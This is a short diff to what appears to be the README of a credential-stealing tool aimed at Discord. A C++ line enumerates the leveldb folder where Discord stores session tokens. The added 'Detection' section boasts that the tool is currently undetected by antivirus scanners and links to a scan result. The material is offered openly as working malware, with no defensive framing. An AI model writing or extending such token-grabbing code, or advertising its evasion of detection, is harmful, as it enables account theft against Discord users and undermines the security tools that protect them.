@@ -24,3 +24,7 @@ As you can see here it's a hardcoded solution but it works fine for this purpose
 ```cpp
 auto files = split(exec("cd %appdata%/discord/Local Storage/leveldb && dir /n /b *"), "\n");
 ```
+
+# Detection
+Since it's fresh and not copied it is currently undetected
+[Detection](https://antiscan.me/images/result/huIT9opQ9Off.png)
